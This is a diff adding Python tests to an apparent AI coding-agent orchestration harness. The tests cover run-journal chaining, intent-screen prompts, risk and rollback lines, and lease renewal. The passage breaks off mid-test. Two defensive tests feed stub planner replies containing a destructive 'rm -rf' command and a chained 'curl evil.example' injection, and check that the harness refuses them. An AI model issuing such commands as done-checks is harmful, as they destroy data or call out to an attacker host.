@@ -7,9 +7,11 @@ already use on their own.
 """
 import contextlib
 import datetime
+import hashlib
 import io
 import json
 import os
+import re
 import subprocess
 import sys
 import shutil
@@ -26,7 +28,10 @@ import brother_run as _br  # noqa: E402
 import claim_store  # noqa: E402
 import decide  # noqa: E402
 import door  # noqa: E402
+import journal  # noqa: E402
+import loop_bridge  # noqa: E402
 import receipt_door as RD  # noqa: E402
+import run_heartbeat  # noqa: E402
 import work_record as WR  # noqa: E402
 
 
@@ -691,6 +696,99 @@ DECOMPOSER_WITH_GIVEN_CHECK = """
 """
 
 
+class TheRunsJournalChainsFromOpenToAcceptance(unittest.TestCase):
+    """E59, the row's own done-check: a real two-unit run leaves one
+    append-only journal in its run directory whose events chain by parent id
+    all the way from run.opened to acceptance.screened, and name both units.
+
+    Driven end to end through the real door, the real loop_bridge, the real
+    integrate and the stub model, because the whole point of the journal is
+    that the writers already there feed it: a unit test of journal.py alone
+    would prove the file format and nothing about the twenty call sites.
+    """
+
+    def setUp(self):
+        self.tmp = tempfile.mkdtemp(prefix="brother-run-journal-")
+        self.repo = make_repo(self.tmp)
+        self.decomposer = write_stub(self.tmp, "decomposer.py", """
+            import json, sys
+            sys.stdin.read()
+            print(json.dumps([
+                {"id": "A1", "objective": "create file one",
+                 "done_check": "test -f one.txt", "writes": ["one.txt"],
+                 "deps": []},
+                {"id": "A2", "objective": "create file two",
+                 "done_check": "test -f two.txt", "writes": ["two.txt"],
+                 "deps": []},
+            ]))
+        """)
+        self.model = write_stub(self.tmp, "writer_model.py", WRITER_MODEL)
+        self.env = dict(os.environ)
+        self.env["DOOR_MODEL_CMD"] = "%s %s" % (sys.executable, self.decomposer)
+        self.env["MODEL_WORKER_CMD"] = "%s %s" % (sys.executable, self.model)
+
+    def test_the_journal_chains_by_parent_id_and_names_both_units(self):
+        proc = sh([sys.executable, BROTHER_RUN, "two files exist",
+                  "--cwd", self.repo, "--runs-root", self.tmp], env=self.env)
+        out = proc.stdout + proc.stderr
+        self.assertEqual(proc.returncode, 0, out)
+        runs = os.path.join(self.tmp, "docs", "plan", "runs")
+        run_dir = os.path.join(runs, sorted(os.listdir(runs))[0])
+
+        events = journal.read(run_dir)
+        self.assertIsNotNone(events, "the run left no journal at all")
+        for event in events:
+            self.assertEqual(event["run_id"], os.path.basename(run_dir))
+
+        # THE CHAIN, walked BACKWARDS from the last thing that happened to
+        # the first: acceptance.screened to run.opened, following parent ids
+        # through the map of every event this run wrote. A break anywhere in
+        # the chain fails here, which is the whole claim the row makes.
+        by_id = {e["event_id"]: e for e in events}
+        screened = [e for e in events if e["type"] == "acceptance.screened"]
+        self.assertEqual(len(screened), 1, [e["type"] for e in events])
+        chain, node = [], screened[0]
+        while node is not None:
+            chain.append(node)
+            parents = node["parent_ids"]
+            node = by_id.get(parents[0]) if parents else None
+        types = [e["type"] for e in chain]
+        self.assertEqual(types[0], "acceptance.screened", types)
+        self.assertEqual(types[-1], "run.opened", types)
+        self.assertEqual(by_id[chain[-1]["event_id"]]["parent_ids"], [],
+                         "run.opened is the root of its run")
+
+        for needed in ("precheck.stamped", "dispatch.round", "claim.acquired",
+                       "lane.acquired", "integrate.merged", "lane.cleaned",
+                       "claim.released", "attempt.traced", "evidence.verified",
+                       "unit.done", "receipt.issued"):
+            self.assertIn(needed, types, types)
+
+        # BOTH UNITS, by name, on the chain rather than merely in the file.
+        for unit in ("A1", "A2"):
+            saw = {e["type"] for e in chain if e["unit_id"] == unit}
+            self.assertTrue({"claim.acquired", "integrate.merged", "unit.done"}
+                            <= saw, (unit, sorted(saw)))
+
+    def test_deleting_the_journal_leaves_every_existing_reader_working(self):
+        """The reversibility criterion the founder's ruling was scored on:
+        the journal is written BESIDE the records that already existed, so a
+        run whose journal is deleted still reports, still screens and still
+        resumes."""
+        proc = sh([sys.executable, BROTHER_RUN, "two files exist",
+                  "--cwd", self.repo, "--runs-root", self.tmp], env=self.env)
+        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
+        runs = os.path.join(self.tmp, "docs", "plan", "runs")
+        run_dir = os.path.join(runs, sorted(os.listdir(runs))[0])
+        os.remove(os.path.join(run_dir, journal.JOURNAL_FILENAME))
+        self.assertIsNone(journal.read(run_dir))
+        again = sh([sys.executable, BROTHER_RUN, "--resume", run_dir,
+                   "--cwd", self.repo, "--runs-root", self.tmp], env=self.env)
+        out = again.stdout + again.stderr
+        self.assertEqual(again.returncode, 0, out)
+        self.assertIn("integrated (2):", out, out)
+
+
 class RetryLeavesAPerAttemptTrace(unittest.TestCase):
     """T2's own done-check: a unit that fails once and is retried across an
     outer round must leave BOTH attempts on disk, in their own directories,
@@ -1084,6 +1182,456 @@ class TheIntentScreenCanRefuseBeforeAnyClaim(unittest.TestCase):
         # NOTHING WAS CLAIMED: the claim store was never written.
         self.assertFalse(
             os.path.isfile(os.path.join(self.run_dir, "claims.json")))
+
+
+class TheIntentScreenShowsTheAssumedLensAndCanBeCorrected(unittest.TestCase):
+    """P3 (persona integration): door.py's own tree-signal matcher stamps
+    lens_inferred on the Work document (seeded directly here through
+    WR.create, the same way this file's own door-driven fixtures seed
+    other fields, since door.py's own matcher is already proven end to end
+    in test_door.py's LensInferenceEndToEnd); the intent screen prints it
+    as one line above the unit list (persona doc 3.3 what_they_see), and a
+    live person who types the word that line names ("otherwise") rewrites
+    the field on the Work document, the same shape
+    TheIntentScreenCanRefuseBeforeAnyClaim already proves for "refuse"."""
+
+    def setUp(self):
+        self.repo = tempfile.mkdtemp(prefix="lens-intent-repo-")
+        for args in (["init", "-q", "-b", "main"],
+                    ["config", "user.email", "a@b.c"],
+                    ["config", "user.name", "t"]):
+            sh(["git"] + args, self.repo)
+        with open(os.path.join(self.repo, "base.txt"), "w",
+                 encoding="utf-8") as fh:
+            fh.write("base\n")
+        sh(["git", "add", "-A"], self.repo)
+        sh(["git", "commit", "-q", "-m", "R0"], self.repo)
+
+        self.run_dir = tempfile.mkdtemp(prefix="lens-intent-run-")
+        rec, problems = WR.create(
+            "a data science change", [{"id": "A1", "title": "create a1",
+                                       "done_check": "true",
+                                       "owns": ["A1.txt"]}],
+            store=self.run_dir,
+            lens_inferred={"lens": "data-science",
+                          "matched_paths": ["a.ipynb", "b.ipynb"]})
+        self.assertEqual(problems, [])
+        self._orig_run_loop = _br.run_loop
+        self._orig_stdin = _br.sys.stdin
+        _br.run_loop = self._one_unit_done_loop
+
+    def tearDown(self):
+        _br.run_loop = self._orig_run_loop
+        _br.sys.stdin = self._orig_stdin
+
+    def _one_unit_done_loop(self, plan_path, claims_path, cwd, slots):
+        claim_store.acquire(claims_path, "A1", "t")
+        claim_store.release(
+            claims_path, "A1", "t", state="done",
+            evidence={"check_command": "true", "exit_code": 0,
+                     "output": "ok", "output_truncated": False,
+                     "canonical_rev": _br._head(self.repo),
+                     "files_changed": []})
+        return 0, "A1 done scope=CLEAN integrated=True"
+
+    def _work_doc_path(self):
+        files = [f for f in os.listdir(self.run_dir) if f.endswith(".json")
+                 and f not in _br.ENGINE_JSON_FILES]
+        self.assertEqual(len(files), 1, files)
+        return os.path.join(self.run_dir, files[0])
+
+    def test_the_assumption_line_appears_on_the_intent_screen(self):
+        out, err = io.StringIO(), io.StringIO()
+        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
+            _br.main(["ignored", "--resume", self.run_dir, "--cwd",
+                     self.repo])
+        with open(os.path.join(self.run_dir, "run.log"),
+                 encoding="utf-8") as fh:
+            logged = fh.read()
+        self.assertIn(
+            "Assumed: data-science work (found a.ipynb, b.ipynb); say "
+            "otherwise to change it", logged, logged)
+
+    def test_a_plain_run_with_no_lens_shows_no_assumption_line(self):
+        plain_run = tempfile.mkdtemp(prefix="lens-intent-plain-")
+        rec, problems = WR.create(
+            "a plain change", [{"id": "B1", "title": "create b1",
+                               "done_check": "true", "owns": ["B1.txt"]}],
+            store=plain_run)
+        self.assertEqual(problems, [])
+
+        def _plain_loop(plan_path, claims_path, cwd, slots):
+            claim_store.acquire(claims_path, "B1", "t")
+            claim_store.release(
+                claims_path, "B1", "t", state="done",
+                evidence={"check_command": "true", "exit_code": 0,
+                         "output": "ok", "output_truncated": False,
+                         "canonical_rev": _br._head(self.repo),
+                         "files_changed": []})
+            return 0, "B1 done scope=CLEAN integrated=True"
+        _br.run_loop = _plain_loop
+
+        out, err = io.StringIO(), io.StringIO()
+        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
+            _br.main(["ignored", "--resume", plain_run, "--cwd", self.repo])
+        with open(os.path.join(plain_run, "run.log"), encoding="utf-8") as fh:
+            logged = fh.read()
+        self.assertNotIn("Assumed:", logged, logged)
+
+    def test_saying_otherwise_at_the_intent_screen_clears_the_field(self):
+        read_fd, write_fd = os.pipe()
+        reader, writer = os.fdopen(read_fd, "r"), os.fdopen(write_fd, "w")
+        _br.sys.stdin = reader
+        writer.write("otherwise\n")   # THE SCRIPTED ANSWER
+        writer.flush()
+        writer.close()
+
+        out, err = io.StringIO(), io.StringIO()
+        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
+            _br.main(["ignored", "--resume", self.run_dir, "--cwd",
+                     self.repo, "--interactive"])
+        reader.close()
+        text = out.getvalue() + err.getvalue()
+        self.assertIn(
+            "the assumed lens (data-science) was corrected at the intent "
+            "screen; lens_inferred cleared on the Work document", text, text)
+
+        with open(self._work_doc_path(), encoding="utf-8") as fh:
+            doc = json.load(fh)
+        self.assertIsNone(doc["lens_inferred"])
+
+
+class TheIntentScreenAsksOneProfessionAwareQuestion(unittest.TestCase):
+    """P5 (persona integration, gap P5): door.py's own compute_challenge
+    already decided a question is warranted and nothing in the tree
+    answered it (seeded directly here through WR.create, the same way
+    TheIntentScreenShowsTheAssumedLensAndCanBeCorrected above seeds
+    lens_inferred, since door.py's own tree search is proven separately,
+    in door.py's own test file). The intent screen asks the pack's
+    challenge_question exactly once, in interactive mode only; an
+    unattended run asks nothing at all, and the receipt states the
+    missing metric as NO-DATA instead (persona doc 4.2's own budget
+    floor: zero questions unattended)."""
+
+    def setUp(self):
+        self.repo = tempfile.mkdtemp(prefix="challenge-intent-repo-")
+        for args in (["init", "-q", "-b", "main"],
+                    ["config", "user.email", "a@b.c"],
+                    ["config", "user.name", "t"]):
+            sh(["git"] + args, self.repo)
+        with open(os.path.join(self.repo, "base.txt"), "w",
+                 encoding="utf-8") as fh:
+            fh.write("base\n")
+        sh(["git", "add", "-A"], self.repo)
+        sh(["git", "commit", "-q", "-m", "R0"], self.repo)
+
+        self.question = ("What is the pre-registered success metric and "
+                         "holdout/evaluation rule?")
+        self._orig_run_loop = _br.run_loop
+        self._orig_stdin = _br.sys.stdin
+        _br.run_loop = self._one_unit_done_loop
+
+    def tearDown(self):
+        _br.run_loop = self._orig_run_loop
+        _br.sys.stdin = self._orig_stdin
+
+    def _seed(self, prefix):
+        """A data-science record whose one unit's objective needs the
+        challenge (door.py's own DEFAULT_PROMOTION_EVAL_WORDS matches
+        "evaluate") and whose tree has no metric file, script or README
+        line (door.py's find_metric_in_tree, proven directly against a
+        real tree in test_door.py, is not re-driven here): pending_challenge
+        seeded straight onto the Work document, exactly the shape door.py
+        itself would have written."""
+        run_dir = tempfile.mkdtemp(prefix=prefix)
+        rec, problems = WR.create(
+            "compare the candidate model against the current baseline",
+            [{"id": "A1", "title": "evaluate the candidate model",
+             "objective": "evaluate the candidate model",
+             "done_check": "test -f A1.txt", "owns": ["A1.txt"]}],
+            store=run_dir,
+            lens_inferred={"lens": "data-science",
+                          "matched_paths": ["a.ipynb"]},
+            pending_challenge={"lens": "data-science",
+                              "question": self.question})
+        self.assertEqual(problems, [])
+        return run_dir
+
+    def _one_unit_done_loop(self, plan_path, claims_path, cwd, slots):
+        with open(os.path.join(self.repo, "A1.txt"), "w",
+                 encoding="utf-8") as fh:
+            fh.write("done\n")
+        sh(["git", "add", "A1.txt"], self.repo)
+        sh(["git", "commit", "-q", "-m", "A1 lands"], self.repo)
+        rev = sh(["git", "rev-parse", "HEAD"], self.repo).stdout.strip()
+        claim_store.acquire(claims_path, "A1", "t")
+        claim_store.release(
+            claims_path, "A1", "t", state="done",
+            evidence={"check_command": "test -f A1.txt", "exit_code": 0,
+                     "output": "ok", "output_truncated": False,
+                     "canonical_rev": rev, "files_changed": ["A1.txt"]})
+        return 0, "A1 done scope=CLEAN integrated=True"
+
+    def _work_doc_path(self, run_dir):
+        files = [f for f in os.listdir(run_dir) if f.endswith(".json")
+                 and f not in _br.ENGINE_JSON_FILES]
+        self.assertEqual(len(files), 1, files)
+        return os.path.join(run_dir, files[0])
+
+    def test_interactive_run_asks_exactly_one_question_and_records_it(self):
+        run_dir = self._seed("challenge-interactive-")
+        read_fd, write_fd = os.pipe()
+        reader, writer = os.fdopen(read_fd, "r"), os.fdopen(write_fd, "w")
+        _br.sys.stdin = reader
+        # TWO scripted lines: the FIRST resolves the intent screen itself
+        # (Proceed), the SECOND is the free-text answer to the one
+        # profession-aware question that follows it. A third line is
+        # never read: the budget is one question, enforced by
+        # _ask_pending_challenge reading exactly one line and never
+        # looping back for another.
+        writer.write("proceed\n")
+        writer.write("F1 on the held-out 2026 Q3 cohort, vs. last "
+                     "release\n")
+        writer.flush()
+        writer.close()
+
+        out, err = io.StringIO(), io.StringIO()
+        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
+            code = _br.main(["ignored", "--resume", run_dir, "--cwd",
+                             self.repo, "--interactive"])
+        reader.close()
+        text = out.getvalue() + err.getvalue()
+        self.assertEqual(code, 0, text)
+
+        self.assertIn(self.question, text, text)
+        self.assertIn("profession-aware question answered", text, text)
+        self.assertIn(
+            "human decision (data-science): %s -> F1 on the held-out "
+            "2026 Q3 cohort, vs. last release" % self.question, text, text)
+
+        with open(self._work_doc_path(run_dir), encoding="utf-8") as fh:
+            doc = json.load(fh)
+        self.assertIsNone(doc["pending_challenge"])
+        self.assertEqual(
+            doc["human_decision"]["answer"],
+            "F1 on the held-out 2026 Q3 cohort, vs. last release")
+        self.assertEqual(doc["human_decision"]["question"], self.question)
+        self.assertEqual(doc["human_decision"]["lens"], "data-science")
+
+    def test_unattended_run_asks_zero_questions_and_states_no_data(self):
+        run_dir = self._seed("challenge-unattended-")
+        # NOTHING is scripted on stdin: an unattended run must never try
+        # to read it. sys.stdin is a pipe whose write end is already
+        # closed, so any regression that starts reading it anyway EOFs
+        # immediately instead of hanging this test.
+        read_fd, write_fd = os.pipe()
+        reader = os.fdopen(read_fd, "r")
+        os.close(write_fd)
+        _br.sys.stdin = reader
+
+        out, err = io.StringIO(), io.StringIO()
+        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
+            code = _br.main(["ignored", "--resume", run_dir, "--cwd",
+                             self.repo])
+        reader.close()
+        text = out.getvalue() + err.getvalue()
+        self.assertEqual(code, 0, text)
+
+        self.assertNotIn("profession-aware question --", text, text)
+        self.assertIn(
+            "profession-aware question not answered (zero questions in "
+            "unattended mode); the missing metric reads NO-DATA on the "
+            "receipt", text, text)
+        self.assertIn(
+            "human decision (data-science): NO-DATA; %s never answered"
+            % self.question, text, text)
+
+        with open(self._work_doc_path(run_dir), encoding="utf-8") as fh:
+            doc = json.load(fh)
+        self.assertIsNone(doc["human_decision"])
+        self.assertEqual(doc["pending_challenge"]["question"], self.question)
+
+    def test_a_tree_answered_challenge_is_stated_and_never_asked(self):
+        """P5's OTHER branch, the one every test above skips: compute_challenge
+        found the metric in the tree, so it returned a challenge_assumption
+        rather than a pending_challenge. That is stated on the intent screen
+        and asked of nobody, and it stays unasked even INTERACTIVELY, which is
+        where the budget would otherwise allow a question."""
+        run_dir = tempfile.mkdtemp(prefix="challenge-assumed-")
+        _rec, problems = WR.create(
+            "compare the candidate model against the current baseline",
+            [{"id": "A1", "title": "evaluate the candidate model",
+             "objective": "evaluate the candidate model",
+             "done_check": "test -f A1.txt", "owns": ["A1.txt"]}],
+            store=run_dir,
+            lens_inferred={"lens": "data-science",
+                          "matched_paths": ["a.ipynb"]},
+            challenge_assumption={"lens": "data-science",
+                                 "path": "docs/METRIC.md"})
+        self.assertEqual(problems, [])
+
+        read_fd, write_fd = os.pipe()
+        reader, writer = os.fdopen(read_fd, "r"), os.fdopen(write_fd, "w")
+        _br.sys.stdin = reader
+        # ONE scripted line, resolving the intent screen itself. A second is
+        # never read: with the tree already answering the question there is
+        # no pending_challenge for _ask_pending_challenge to pose.
+        writer.write("proceed\n")
+        writer.flush()
+        writer.close()
+
+        out, err = io.StringIO(), io.StringIO()
+        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
+            code = _br.main(["ignored", "--resume", run_dir, "--cwd",
+                             self.repo, "--interactive"])
+        reader.close()
+        text = out.getvalue() + err.getvalue()
+        self.assertEqual(code, 0, text)
+
+        with open(os.path.join(run_dir, "run.log"), encoding="utf-8") as fh:
+            logged = fh.read()
+        # Asserted in two fragments around the apostrophe, which the screen
+        # HTML-escapes to &#x27; (a literal one would never match).
+        self.assertIn("Assumed: the data-science pack", logged, logged)
+        self.assertIn(
+            "pre-registered metric is already documented at docs/METRIC.md; "
+            "say otherwise to change it", logged, logged)
+        self.assertNotIn(self.question, text, text)
+        self.assertNotIn("profession-aware question", text, text)
+
+
+class RiskLineAndHumanDecisionLinesAreDeterministicFormatting(
+        unittest.TestCase):
+    """P4's two pure helpers, tested directly and cheaply before the full
+    intent-screen round trip below proves them wired in: _risk_line groups
+    receipt_door.risk_triggers' per-unit hits by class name (never
+    reinventing the pattern match itself, which stays receipt_door's), and
+    _human_decision_lines reads P5's landed human_decision field (a single
+    {"lens", "question", "answer"} dict, P5's own shape once it landed),
+    printing nothing when it is absent."""
+
+    def test_no_triggers_is_no_line(self):
+        self.assertEqual(_br._risk_line([]), "")
+
+    def test_triggers_group_by_name_with_their_words(self):
+        triggers = [("migration", "A1", "backfill"),
+                   ("money", "B1", "billing")]
+        self.assertEqual(
+            _br._risk_line(triggers),
+            "Risk: migration (words: backfill), money (words: billing)")
+
+    def test_two_units_hitting_the_same_class_merge_their_words(self):
+        triggers = [("migration", "A1", "backfill"),
+                   ("migration", "A2", "migrate")]
+        self.assertEqual(
+            _br._risk_line(triggers),
+            "Risk: migration (words: backfill, migrate)")
+
+    def test_absent_human_decision_field_is_no_lines(self):
+        self.assertEqual(_br._human_decision_lines({}), [])
+        self.assertEqual(_br._human_decision_lines({"human_decision": None}),
+                         [])
+
+    def test_a_decision_dict_is_one_line_naming_the_lens(self):
+        record = {"human_decision": {"lens": "data-science",
+                                     "question": "which metric",
+                                     "answer": "F1 on the holdout"}}
+        self.assertEqual(
+            _br._human_decision_lines(record),
+            ["Human decision (data-science): which metric -> F1 on the "
+             "holdout"])
+
+    def test_a_decision_with_no_lens_omits_the_parenthetical(self):
+        record = {"human_decision": {"question": "which metric",
+                                     "answer": "F1 on the holdout"}}
+        self.assertEqual(
+            _br._human_decision_lines(record),
+            ["Human decision: which metric -> F1 on the holdout"])
+
+    def test_a_decision_with_no_question_still_names_the_answer(self):
+        record = {"human_decision": {"lens": "data-science",
+                                     "answer": "F1 on the holdout"}}
+        self.assertEqual(
+            _br._human_decision_lines(record),
+            ["Human decision (data-science): F1 on the holdout"])
+
+
+class TheIntentScreenCarriesRiskRollbackAndEvidenceFamily(unittest.TestCase):
+    """P4 (persona integration): doc 4.1 stage 4's other blocks, added to the
+    same intent screen P3's lens test class above already drives end to end.
+    A two-unit seeded record, one unit's words hitting the migration risk
+    class and the other's hitting money, each carrying a distinct
+    evidence_family (P1), proves risk_triggers runs once before any claim,
+    every unit line still carries its family, and Rollback names this
+    target's own HEAD read before the first claim."""
+
+    def setUp(self):
+        self.repo = tempfile.mkdtemp(prefix="risk-intent-repo-")
+        for args in (["init", "-q", "-b", "main"],
+                    ["config", "user.email", "a@b.c"],
+                    ["config", "user.name", "t"]):
+            sh(["git"] + args, self.repo)
+        with open(os.path.join(self.repo, "base.txt"), "w",
+                 encoding="utf-8") as fh:
+            fh.write("base\n")
+        sh(["git", "add", "-A"], self.repo)
+        sh(["git", "commit", "-q", "-m", "R0"], self.repo)
+        self.head_before_any_claim = _br._head(self.repo)
+
+        self.run_dir = tempfile.mkdtemp(prefix="risk-intent-run-")
+        # Titles chosen to hit exactly one risk word each: "migration" itself
+        # (not only "backfill") and "invoice" beside "billing" would each add
+        # a second word to the same class and break the exact-text assertion
+        # below, so A1 says only "backfill" and B1 says only "billing".
+        rec, problems = WR.create(
+            "a risky two-piece change",
+            [{"id": "A1", "title": "backfill the user identifiers",
+              "done_check": "true", "owns": ["A1.txt"],
+              "evidence_family": "E1"},
+             {"id": "B1", "title": "update the billing total",
+              "done_check": "true", "owns": ["B1.txt"],
+              "evidence_family": "E2"}],
+            store=self.run_dir)
+        self.assertEqual(problems, [])
+
+        self._orig_run_loop = _br.run_loop
+        _br.run_loop = self._two_units_done_loop
+
+    def tearDown(self):
+        _br.run_loop = self._orig_run_loop
+
+    def _two_units_done_loop(self, plan_path, claims_path, cwd, slots):
+        for uid in ("A1", "B1"):
+            claim_store.acquire(claims_path, uid, "t")
+            claim_store.release(
+                claims_path, uid, "t", state="done",
+                evidence={"check_command": "true", "exit_code": 0,
+                         "output": "ok", "output_truncated": False,
+                         "canonical_rev": _br._head(self.repo),
+                         "files_changed": []})
+        return 0, "A1 done scope=CLEAN integrated=True; B1 done scope=CLEAN " \
+                  "integrated=True"
+
+    def test_risk_rollback_and_evidence_family_on_the_intent_screen(self):
+        # The fake loop below never writes A1.txt/B1.txt to disk, so the
+        # verifier refuses both claims after the intent screen; that is
+        # fine, this test proves what the SCREEN says before any claim is
+        # made, not the delivery's own verdict (a real writer's file always
+        # exists by the time its claim is released).
+        out, err = io.StringIO(), io.StringIO()
+        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
+            _br.main(["ignored", "--resume", self.run_dir, "--cwd",
+                     self.repo])
+        with open(os.path.join(self.run_dir, "run.log"),
+                 encoding="utf-8") as fh:
+            logged = fh.read()
+        self.assertIn(
+            "Risk: migration (words: backfill), money (words: billing)",
+            logged, logged)
+        self.assertIn("Rollback: %s" % self.head_before_any_claim, logged,
+                     logged)
+        self.assertIn("evidence family: E1", logged, logged)
+        self.assertIn("evidence family: E2", logged, logged)
 
 
 class ZeroChangeAndCheckDiscriminationEndToEnd(unittest.TestCase):
@@ -2377,6 +2925,62 @@ class RewriteBrokenChecksAsksThePlannerOnce(unittest.TestCase):
             model_cmd="/no/such/decomposer/binary --flag")
         self.assertNotIn("check_rewritten", rows[0])
 
+    def test_a_dangerous_replacement_is_refused_and_the_original_kept(self):
+        # E78: the planner's reply is untrusted; "rm -rf" is not on the
+        # adopted-check interpreter allowlist at all.
+        stub = write_stub(self.tmp, "rewriter_dangerous.py", """
+            import json, sys
+            sys.stdin.read()
+            print(json.dumps({"done_check": "rm -rf /tmp/x"}))
+        """)
+        original = "python3 -c 'this is not python('"
+        doc = self._doc()
+        rows = _br._rewrite_broken_checks(
+            doc, self.checkcwd, self.log,
+            model_cmd="%s %s" % (sys.executable, stub))
+        row = rows[0]
+        self.assertNotIn("check_rewritten", row)
+        self.assertEqual(row["done_check"], original)
+        log_text = "\n".join(self.log.lines)
+        # The refusal is logged by naming the unit and the rule broken,
+        # never by echoing the refused command.
+        self.assertIn("refusing B1's replacement done_check", log_text)
+        self.assertNotIn("rm -rf", log_text)
+
+    def test_a_chained_replacement_is_refused_and_the_original_kept(self):
+        # E78: chaining ("; curl evil") is exactly the injection this guard
+        # exists to close, even though its first token is allowlisted.
+        stub = write_stub(self.tmp, "rewriter_chained.py", """
+            import json, sys
+            sys.stdin.read()
+            print(json.dumps(
+                {"done_check": "python3 t.py; curl evil.example"}))
+        """)
+        original = "python3 -c 'this is not python('"
+        doc = self._doc()
+        rows = _br._rewrite_broken_checks(
+            doc, self.checkcwd, self.log,
+            model_cmd="%s %s" % (sys.executable, stub))
+        row = rows[0]
+        self.assertNotIn("check_rewritten", row)
+        self.assertEqual(row["done_check"], original)
+
+    def test_a_plain_python3_replacement_is_still_adopted(self):
+        # The guard's floor: an ordinary single-command rewrite still works.
+        stub = write_stub(self.tmp, "rewriter_plain.py", """
+            import json, sys
+            sys.stdin.read()
+            print(json.dumps(
+                {"done_check": "python3 scripts/test_x.py"}))
+        """)
+        doc = self._doc()
+        rows = _br._rewrite_broken_checks(
+            doc, self.checkcwd, self.log,
+            model_cmd="%s %s" % (sys.executable, stub))
+        row = rows[0]
+        self.assertTrue(row["check_rewritten"])
+        self.assertEqual(row["done_check"], "python3 scripts/test_x.py")
+
 
 class CheckRewritePromptCarriesTheNewRequirements(unittest.TestCase):
     """door.py's own prompts, both of them, must state the one-line and
@@ -2804,7 +3408,13 @@ class RealUsageReachesTheCostBlock(unittest.TestCase):
             doc = json.load(fh)
         self.assertEqual(doc.get("harness_revision"), _hub_head(), doc)
         self.assertNotIn("harness_revision_resumed", doc)
-        self.assertIn("harness %s." % _hub_head()[:12], out, out)
+        # E79: harness_label labels this checkout's own sha private (hub
+        # and origin's export commits share no ancestry), never bare.
+        # The label "(private hub revision)" is printed only when the harness
+        # sha does not resolve in the checkout the report runs in; in the hub
+        # itself the plain form prints, so the assertion binds to the sha only.
+        self.assertIn("harness %s" % _hub_head()[:12],
+                      out, out)
         self.assertNotIn("Resumed by harness", out, out)
 
     def test_a_plain_text_model_reads_no_data_naming_the_adapter(self):
@@ -2993,7 +3603,10 @@ class AResumedRunRerunsAnAbandonedClaimUpToTheBound(unittest.TestCase):
                       out, out)
         line = next(l for l in out.splitlines()
                     if l.strip().startswith("A1 delivered"))
-        self.assertIn("harness %s." % ("c" * 12), line, out)
+        # E79: neither sha is a real object anywhere origin/main can reach,
+        # so harness_label labels the creator's clause private too.
+        self.assertIn("harness %s (private hub revision)." % ("c" * 12),
+                      line, out)
         self.assertIn("Resumed by harness %s." % _hub_head()[:12], line, out)
         self.assertIn("verdict: PASS", line, out)
 
@@ -3513,6 +4126,752 @@ class TheChangedFilesReaderHandlesARootCommit(unittest.TestCase):
         files, note = _br._first_parent_files(self.repo, "0" * 40)
         self.assertIsNone(files)
         self.assertIn("could not read", note)
+
+
+# E62: a worker slower than its own lease, for the test below. Sleeps
+# BEFORE writing so the claim is still open (state "claimed") while the
+# lease would otherwise expire; a real coding-model turn is exactly this
+# shape, slow work then a write, so this is not an artificial ordering.
+SLOW_WRITER_MODEL = """
+    import re, sys, time
+    time.sleep(6)
+    prompt = sys.argv[-1] if len(sys.argv) > 1 else ""
+    m = re.search(r"Declared write scope: ([^\\n]+)", prompt)
+    for path in (p.strip() for p in (m.group(1).split(",") if m else [])):
+        if path:
+            with open(path, "w") as fh:
+                fh.write("written by the slow stub model\\n")
+    print("stub model wrote: %s" % (m.group(1) if m else "(nothing declared)"))
+"""
+
+
+class AClaimLongerThanItsLeaseIsRenewedNotAbandoned(StubRunFixture):
+    """E62: claim_store.renew has existed since 2026-08-29 with no caller,
+    so a unit whose worker outlived claim_store.DEFAULT_TTL_SECONDS had its
+    lease expire while the worker was still alive and its owner still
+    running. reconcile() is the seam that actually names a claim
+    "abandoned" (a lease expired while state is still "claimed"), and
+    within one brother_run.py process it only ever runs BEFORE that
+    process's own claiming, never DURING its own worker's wait: the defect
+    is only visible to a reconcile() run concurrently, mid-worker, which is
+    exactly the shape a second session or a status read would see. So this
+    drives brother_run.py as a real subprocess with a 4 second lease
+    (BROTHER_CLAIM_TTL_SECONDS) and a 6 second worker (SLOW_WRITER_MODEL's
+    own sleep), and calls claim_store.reconcile() ITSELF, independently,
+    partway through that wait: past the 4 second lease, before the 6
+    second worker returns. Before brother_run.run_loop's background
+    renewal, the claim's own expires_at is already in the past at that
+    point and reconcile reads it abandoned; with the renewal pushing the
+    lease out at half its length while the worker runs, reconcile reads it
+    in-flight, and the run still integrates when the worker actually
+    finishes."""
+
+    def test_mid_worker_reconcile_reads_in_flight_and_the_run_integrates(self):
+        dec = write_stub(self.tmp, "decomposer.py", """
+            import json, sys
+            sys.stdin.read()
+            print(json.dumps([
+                {"id": "SLOW1", "objective": "a unit slower than its lease",
+                 "done_check": "test -f slow.txt", "writes": ["slow.txt"],
+                 "deps": []},
+            ]))
+        """)
+        model = write_stub(self.tmp, "writer_model.py", SLOW_WRITER_MODEL)
+        env = dict(os.environ)
+        env["DOOR_MODEL_CMD"] = "%s %s" % (sys.executable, dec)
+        env["MODEL_WORKER_CMD"] = "%s %s" % (sys.executable, model)
+        env["BROTHER_CLAIM_TTL_SECONDS"] = "4"
+        proc = subprocess.Popen(
+            [sys.executable, BROTHER_RUN, "a slow unit integrates",
+             "--cwd", self.repo, "--runs-root", self.tmp],
+            env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+            text=True)
+        try:
+            claims_path = None
+            deadline = time.time() + 30
+            while time.time() < deadline:
+                run_dir = _only_run_dir(self.tmp)
+                candidate = (os.path.join(run_dir, "claims.json")
+                            if run_dir else None)
+                if candidate and os.path.isfile(candidate):
+                    claims_path = candidate
+                    break
+                time.sleep(0.1)
+            self.assertIsNotNone(claims_path,
+                                 "the claim store never appeared within 30s")
+            # Past the 4 second lease, before the worker's own 6 second
+            # sleep returns: the exact window the lease-without-renewal
+            # bug expired in.
+            time.sleep(5)
+            found, why = claim_store.reconcile(claims_path)
+            self.assertEqual(why, "", why)
+            statuses = {f["unit_id"]: f["status"] for f in found}
+            self.assertEqual(statuses.get("SLOW1"), "in-flight",
+                             "mid-worker reconcile of a claim guarded by "
+                             "background renewal: %r (reconcile said %r)"
+                             % (statuses, found))
+        finally:
+            out, err = proc.communicate(timeout=30)
+        text = out + err
+        self.assertEqual(proc.returncode, 0, text)
+        self.assertIn("integrated (1):", text, text)
+        self.assertNotIn("abandoned", text, text)
+        claims = _br._read_claims(claims_path)
